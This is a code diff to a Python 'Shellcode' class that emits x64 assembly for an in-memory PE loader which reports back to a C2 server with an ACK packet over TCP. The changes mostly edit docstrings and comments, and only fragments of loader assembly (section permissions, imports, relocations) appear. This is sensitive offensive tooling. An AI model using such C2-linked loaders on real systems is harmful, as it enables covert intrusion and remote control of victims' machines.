@@ -66,7 +66,7 @@ class Shellcode():
 
     arguments["ACKPK"] = {}
     arguments["ACKPK"]["optional"] = "yes"
-    arguments["ACKPK"]["description"] = "File containing acknowledgement packet response"
+    arguments["ACKPK"]["description"] = "File including it's path containing the acknowledgement packet response"
 
     def __init__(self, arg_object):
 
@@ -140,7 +140,11 @@ class Shellcode():
         return
 
     def get_ackpk_len(self):
-        """Generates the size needed by the ACK packet sent to C2
+        """Generates the size needed by the ACK packet sent to the C2 server.
+        Due to bugs encountered when passing raw strings, this function will
+        read from a file. In addition, it instantiates self.ack_packet.
+        Should no file be provided, a default string will be sent over TCP
+        instead.
         """
 
         argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
@@ -157,7 +161,7 @@ class Shellcode():
         return needed_space
 
     def modify_section_perms(self):
-        """Modify permissions for each section
+        """Modify the permissions for each section in the PE file
         """
 
         stub = f"""
@@ -384,7 +388,7 @@ change_permissions:
         return stub
 
     def load_imports(self):
-        """Load functions imported
+        """Load functions imported by the PE
         """
 
         stub = f"""
@@ -493,6 +497,8 @@ check_dll_done:
         """
 
         stub = f"""
+; RAX = rva2offset(PIMAGE_NT_HEADERS64 pNtHeader, // RCX => pNtHeader
+;                  DWORD dwVA);                   // R11 => pNtHeader->OptionalHeader.DataDirectory[X].VirtualAddress
 rva2offset:
     push rbp
     mov rbp, rsp
@@ -567,8 +573,6 @@ change_ImageBase:
     mov [rbp - {self.storage_offsets["lpvPreferableBase"]}], rdx
     mov [r8 + {winnt._IMAGE_OPTIONAL_HEADER64.ImageBase.offset}], rcx
 
-; RAX = rva2offset(PIMAGE_NT_HEADERS64 pNtHeader, // RCX => pNtHeader
-;                  DWORD dwVA);                   // R11 => pNtHeader->OptionalHeader.DataDirectory[winnt.IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
 get_dwOffsetToBaseRelocationTable:
     xor rdx, rdx
     mov rdx, [rbp - {self.storage_offsets['pNtHeader']}]
